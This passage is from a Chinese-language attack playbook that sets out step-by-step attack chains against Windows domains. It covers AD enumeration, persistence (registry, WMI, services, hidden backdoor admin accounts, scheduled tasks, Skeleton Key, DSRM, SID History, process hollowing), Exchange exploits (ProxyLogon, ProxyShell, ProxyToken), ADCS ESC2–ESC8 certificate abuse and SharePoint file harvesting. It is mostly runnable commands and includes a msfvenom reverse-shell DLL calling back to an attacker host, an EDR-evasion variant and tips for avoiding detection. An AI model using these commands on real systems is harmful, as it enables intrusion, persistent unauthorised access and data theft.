_列出域信任关系_
```
nltest /domain_trusts
```

**2. PowerView枚举**  _[windows]_
_使用PowerView枚举信任关系_
```
Get-NetDomainTrust
```

**3. 森林信任**  _[windows]_
_枚举森林信任关系_
```
Get-NetForestTrust
```

**4. 信任详细信息**  _[windows]_
_查看信任详细信息_
```
Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
```

**分析：** 信任关系枚举可以发现跨域/跨森林攻击路径。

**OPSEC：** 信任关系可能提供跨域攻击路径；关注双向信任；注意SID历史问题

---

### 计算机枚举  `computer-enum`
枚举域内计算机
子类：**计算机** · tags: `computer` `enumeration` `active-directory`

**前置条件：** 域环境；任意域用户凭证

**攻击链：**

**1. 列出域计算机**  _[windows]_
_列出域计算机_
```
net group "Domain Computers" /domain
```

**2. PowerView枚举**  _[windows]_
_使用PowerView枚举计算机_
```
Get-NetComputer | select name,operatingsystem,ipv4address
```

**3. 查找域控制器**  _[windows]_
_查找域控制器_
```
Get-NetComputer -DomainController
```

**4. 查找特定系统**  _[windows]_
_查找特定操作系统_
```
Get-NetComputer -OperatingSystem "*Server 2019*"
```

**5. 查找活跃计算机**  _[windows]_
_查找在线计算机_
```
Get-NetComputer -Ping
```

**6. 查找管理员会话**  _[windows]_
_查找域管理员登录位置_
```
Find-DomainUserLocation
```

**分析：** 计算机枚举可以发现域内所有计算机，识别高价值目标。

**OPSEC：** 计算机枚举是正常操作；重点关注域控制器和服务器；查找管理员会话

---


## 权限维持

### 注册表持久化  `persistence-registry`
通过注册表实现权限维持
子类：**注册表** · tags: `persistence` `registry` `windows` `autorun`

**前置条件：** 已获得目标机器权限；管理员权限；Windows系统

**攻击链：**

**1. Run键持久化**  _[windows]_
_添加Run键实现开机自启_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**2. RunOnce键**  _[windows]_
_RunOnce键，执行一次后删除_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**3. Winlogon Helper**  _[windows]_
_修改Userinit实现持久化_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**4. 服务持久化**  _[windows]_
_创建服务实现持久化_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR 绕过变体：**

**1. 隐藏注册表键**
_使用空字节隐藏注册表键_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。

**OPSEC：** Run键是最常见的持久化方式，容易被检测；考虑使用更隐蔽的方式；定期检查注册表异常项

---

### WMI持久化  `persistence-wmi`
通过WMI事件订阅实现持久化
子类：**WMI** · tags: `wmi` `persistence` `windows`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建事件过滤器**  _[windows]_
_创建WMI事件过滤器_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**2. 创建事件消费者**  _[windows]_
_创建命令行消费者_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**3. 绑定过滤器和消费者**  _[windows]_
_绑定触发执行_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```

---

### 启动文件夹持久化  `persistence-startup`
通过启动文件夹实现持久化
子类：**启动文件夹** · tags: `startup` `persistence` `windows`

**前置条件：** 写入权限

**攻击链：**

**1. 当前用户启动文件夹**  _[windows]_
_当前用户启动_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**2. 所有用户启动文件夹**  _[windows]_
_所有用户启动_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### 服务持久化  `persistence-service`
通过创建服务实现持久化
子类：**服务** · tags: `service` `persistence` `windows`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建服务**  _[windows]_
_创建自启动服务_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```

**2. 启动服务**  _[windows]_
_启动服务_
```
sc start evilsvc
```

---

### DLL注入持久化  `persistence-dll-injection`
通过DLL注入实现持久化
子类：**DLL注入** · tags: `dll` `injection` `persistence`

**前置条件：** 代码执行权限；目标进程

**攻击链：**

**1. 创建恶意DLL**  _[linux]_
_生成恶意DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**2. 注入DLL**  _[windows]_
_将DLL注入到运行进程_
```
使用工具如InjectDLL、PowerShell等注入到目标进程
```

**3. AppInit_DLLs**  _[windows]_
_通过AppInit_DLLs注入_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```

---

### 后门用户  `persistence-backdoor-user`
创建后门用户账户
子类：**用户** · tags: `user` `backdoor` `persistence`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建用户**  _[windows]_
_创建管理员用户_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**2. 隐藏用户**  _[windows]_
_创建隐藏用户（$结尾）_
```
net user backdoor$ P@ssw0rd /add
```

**3. 修改注册表隐藏**  _[windows]_
_通过注册表隐藏用户_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```

---

### 隐藏用户  `persistence-hidden-user`
创建隐藏的管理员用户
子类：**隐藏用户** · tags: `hidden` `user` `persistence`

**前置条件：** SYSTEM权限

**攻击链：**

**1. 创建用户**  _[windows]_
_创建$结尾用户_
```
net user hidden$ P@ssw0rd /add
```

**2. 添加到管理员组**  _[windows]_
_添加管理员权限_
```
net localgroup administrators hidden$ /add
```

**3. 注册表隐藏**  _[windows]_
_通过注册表完全隐藏_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
修改F值
reg import user.reg
```

---

### 计划任务持久化  `persistence-scheduled`
通过计划任务实现持久化
子类：**计划任务** · tags: `persistence` `scheduled` `task`

**前置条件：** 创建任务权限

**攻击链：**

**1. 创建登录任务**  _[windows]_
_创建登录时运行的任务_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```

**2. 创建定时任务**  _[windows]_
_创建每5分钟运行的任务_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**3. PowerShell创建**  _[windows]_
_使用PowerShell创建任务_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**4. Linux Cron**  _[linux]_
_Linux计划任务_
```
crontab -e
添加: * * * * * /tmp/backdoor.sh
或: @reboot /tmp/backdoor.sh
```

---

### Skeleton Key后门  `skeleton-key`
在域控制器植入万能密码
子类：**域后门** · tags: `skeleton-key` `backdoor` `domain`

**前置条件：** 域管理员权限；访问域控制器

**攻击链：**

**1. 植入Skeleton Key**  _[windows]_
_使用Mimikatz植入_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

**2. 使用万能密码**  _[windows]_
_使用万能密码登录_
```
万能密码: mimikatz
任何域用户都可以使用mimikatz作为密码登录
```

**3. 检测方法**  _[windows]_
_检测Skeleton Key_
```
检查LSASS内存:
Get-Process lsass
使用EDR检测内存注入
```

---

### DSRM后门  `dsrm-backdoor`
利用DSRM账户建立后门
子类：**域后门** · tags: `dsrm` `backdoor` `domain`

**前置条件：** 域管理员权限；访问域控制器

**攻击链：**

**1. 获取DSRM密码**  _[windows]_
_获取DSRM账户哈希_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
或
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**2. 同步DSRM密码**  _[windows]_
_同步DSRM密码与域管理员_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```

**3. 启用DSRM账户**  _[windows]_
_允许DSRM账户远程登录_
```
修改注册表:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**4. 使用DSRM登录**  _[windows]_
_使用DSRM账户_
```
使用DSRM账户哈希:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
或使用Pass-the-Hash
```

---

### SID History后门  `sid-history`
利用SID History建立后门
子类：**域后门** · tags: `sid-history` `backdoor` `domain`

**前置条件：** 域管理员权限

**攻击链：**

**1. 添加SID History**  _[windows]_
_添加SID History_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
将域管SID添加到普通用户
```

**2. 验证SID History**  _[windows]_
_检查SID History_
```
Get-ADUser backdoor_user -Properties sidHistory
或
whoami /all
```

**3. 使用后门**  _[windows]_
_使用后门账户_
```
使用backdoor_user登录
自动获得域管理员权限
```

---

### 进程镂空持久化  `persistence-process-hollowing`
利用进程镂空技术实现持久化
子类：**进程注入** · tags: `process-hollowing` `persistence` `injection`

**前置条件：** 代码执行权限

**攻击链：**

**1. 进程镂空原理**  _[windows]_
_进程镂空原理_
```
1. 创建合法进程(挂起状态)
2. 替换进程内存
3. 恢复执行
```

**2. C#实现**  _[windows]_
_C#进程镂空_
```
using System.Runtime.InteropServices;
// 创建挂起进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// 替换内存
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**3. 检测方法**  _[windows]_
_检测进程镂空_
```
检查进程内存:
- 进程路径与内存内容不匹配
- 异常的内存区域
- 使用EDR检测
```

---


## Exchange攻击

### ProxyLogon攻击  `proxylogon`
CVE-2021-26855 Exchange SSRF
子类：**ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`

**前置条件：** Exchange可访问

**攻击链：**

**1. 探测漏洞**  _[linux]_
_检查Exchange版本_
```
curl -k https://exchange.com/owa/auth/x.js
检查Exchange版本
```

**2. 利用脚本**  _[linux]_
_利用ProxyLogon_
```
python proxylogon.py -u https://exchange.com -e admin@domain.com
获取管理员邮箱访问权限
```

**3. 手动利用**
_手动构造请求_
```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

构造SSRF请求
```

---

### ProxyShell攻击  `proxyshell`
CVE-2021-34473 Exchange RCE
子类：**ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`

**前置条件：** Exchange可访问

**攻击链：**

**1. 探测漏洞**  _[linux]_
_探测漏洞_
```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
检查是否存在漏洞
```

**2. 利用脚本**  _[linux]_
_利用ProxyShell_
```
python proxyshell.py -u https://exchange.com -e admin@domain.com
获取邮箱访问并执行命令
```

**3. 获取邮件**
_访问邮箱_
```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
访问邮箱内容
```

---

### Exchange枚举  `exchange-enum`
枚举Exchange服务和配置
子类：**枚举** · tags: `exchange` `enum` `recon`

**前置条件：** Exchange可访问

**攻击链：**

**1. 版本探测**  _[linux]_
_探测Exchange版本_
```
curl -k https://exchange.com/owa/auth/logon.aspx
检查页面源码获取版本信息
```

**2. Autodiscover**  _[linux]_
_Autodiscover枚举_
```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
获取Exchange配置信息
```

**3. 邮箱枚举**  _[linux]_
_枚举邮箱用户_
```
python oab.py https://exchange.com
下载离线通讯录枚举用户
```

**4. NTLM泄露**  _[linux]_
_NTLM信息泄露_
```
curl -k https://exchange.com/autodiscover/autodiscover.xml
从WWW-Authenticate头获取域信息
```

---

### ProxyToken攻击  `exchange-proxytoken`
利用Exchange ProxyToken绕过认证
子类：**ProxyToken** · tags: `exchange` `proxytoken` `bypass`

**前置条件：** Exchange服务器；存在漏洞

**攻击链：**

**1. 检测漏洞**  _[linux]_
_检测漏洞_
```
使用ProxyToken工具:
python proxytoken.py -u https://exchange.com -e user@domain.com
检测是否存在漏洞
```

**2. 利用漏洞**  _[linux]_
_获取邮箱访问_
```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
获取用户邮箱访问权限
```

**3. 访问邮箱**
_访问EWS接口_
```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
绕过认证访问EWS
```

---

### Exchange邮箱访问  `exchange-mailbox-access`
通过各种方式访问Exchange邮箱
子类：**邮箱访问** · tags: `exchange` `mailbox` `access`

**前置条件：** Exchange凭证或漏洞

**攻击链：**

**1. OWA访问**
_OWA Web访问_
```
https://exchange.com/owa
使用凭证登录OWA
查看邮件、日历等
```

**2. EWS访问**  _[linux]_
_EWS API访问_
```
使用Impacket:
python exchanger.py domain/user:password@exchange.com
或使用EWSTools
```

**3. Outlook MAPI**  _[windows]_
_Outlook客户端_
```
配置Outlook连接Exchange
使用MAPI协议访问邮箱
支持邮件、日历、联系人
```

**4. 导出邮箱**  _[windows]_
_导出邮箱_
```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
导出邮箱为PST文件
```

---


## ADCS攻击

### ADCS ESC2攻击  `adcs-esc2`
利用ESC2模板配置错误
子类：**ESC2** · tags: `adcs` `esc2` `certificate`

**前置条件：** 域环境；ADCS服务；存在ESC2模板

**攻击链：**

**1. 探测ESC2模板**  _[linux]_
_探测ESC2模板_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
```

**2. 请求证书**  _[linux]_
_请求管理员证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

**3. 使用证书认证**  _[linux]_
_使用证书认证_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
获取管理员TGT
```

---

### ADCS ESC3攻击  `adcs-esc3`
利用ESC3注册代理配置错误
子类：**ESC3** · tags: `adcs` `esc3` `certificate`

**前置条件：** 域环境；ADCS服务；存在ESC3配置

**攻击链：**

**1. 探测ESC3**  _[linux]_
_探测ESC3配置_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找具有Enrollment Agent权限的模板
```

**2. 获取注册代理证书**  _[linux]_
_获取注册代理证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
获取注册代理证书
```

**3. 代表其他用户请求证书**  _[linux]_
_代表管理员请求证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
```

---

### ADCS ESC4攻击  `adcs-esc4`
利用ESC4模板权限配置错误
子类：**ESC4** · tags: `adcs` `esc4` `certificate`

**前置条件：** 域环境；ADCS服务；对模板有写权限

**攻击链：**

**1. 探测ESC4**  _[linux]_
_探测模板权限_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找用户有写权限的模板
```

**2. 修改模板配置**  _[linux]_
_修改模板配置_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
修改模板为ESC1配置
```

**3. 请求证书**  _[linux]_
_请求管理员证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
```

**4. 恢复模板配置**  _[linux]_
_恢复模板配置_
```
certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
恢复原配置避免检测
```

---

### ADCS ESC6攻击  `adcs-esc6`
利用ESC6编辑标志配置错误
子类：**ESC6** · tags: `adcs` `esc6` `certificate`

**前置条件：** 域环境；ADCS服务；CA启用EDITF_ATTRIBUTESUBJECTALTNAME2

**攻击链：**

**1. 探测ESC6**  _[linux]_
_探测CA配置_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
```

**2. 请求证书**  _[linux]_
_请求管理员证书_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
使用-alt参数指定SAN
```

**3. 使用证书认证**  _[linux]_
_认证获取TGT_
```
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

### ADCS ESC8攻击  `adcs-esc8`
利用ESC8 HTTP端点进行NTLM中继
子类：**ESC8** · tags: `adcs` `esc8` `ntlm-relay`

**前置条件：** 域环境；ADCS HTTP端点；可触发NTLM认证

**攻击链：**

**1. 探测ESC8**  _[linux]_
_探测HTTP端点_
```
certipy find -u user@domain.com -p password -dc-ip DC_IP
查找HTTP证书端点
```

**2. 设置NTLM中继**  _[linux]_
_设置NTLM中继_
```
impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
监听NTLM认证并中继到ADCS
```

**3. 触发认证**
_触发目标NTLM认证_
```
使用多种方式触发:
- 发送邮件链接
- 打印机漏洞
- WebDAV
- 其他NTLM触发方式
```

---


## SharePoint攻击

### SharePoint枚举  `sharepoint-enum`
枚举SharePoint站点和文件
子类：**枚举** · tags: `sharepoint` `enum` `recon`

**前置条件：** SharePoint可访问

**攻击链：**

**1. 站点枚举**  _[linux]_
_枚举站点_
```
curl -k https://sharepoint.com/_api/web/webs
获取所有子站点
```

**2. 用户枚举**  _[linux]_
_枚举用户_
```
curl -k https://sharepoint.com/_api/web/siteusers
获取站点用户列表
```

**3. 文件枚举**  _[linux]_
_枚举文档库_
```
curl -k https://sharepoint.com/_api/web/lists
获取文档库列表
```

**4. 搜索文件**  _[linux]_
_搜索敏感内容_
```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
搜索敏感文件
```

---

### SharePoint文件访问  `sharepoint-file-access`
访问SharePoint文档库中的文件
子类：**文件访问** · tags: `sharepoint` `file` `access`

**前置条件：** SharePoint凭证或漏洞

**攻击链：**

**1. Web界面访问**
_Web界面访问_
```
https://sharepoint.com/sites/site_name/Shared Documents
通过浏览器访问文档库
下载敏感文件
```

**2. REST API访问**  _[linux]_
_REST API访问_
```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
获取文档列表
下载文件内容
```

**3. CSOM访问**  _[windows]_
_CSOM访问_
```
使用SharePoint客户端对象模型:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

**4. OneDrive同步**
_OneDrive同步_
```
使用OneDrive客户端同步SharePoint文档库
本地访问所有文件
离线查看敏感数据
```

---

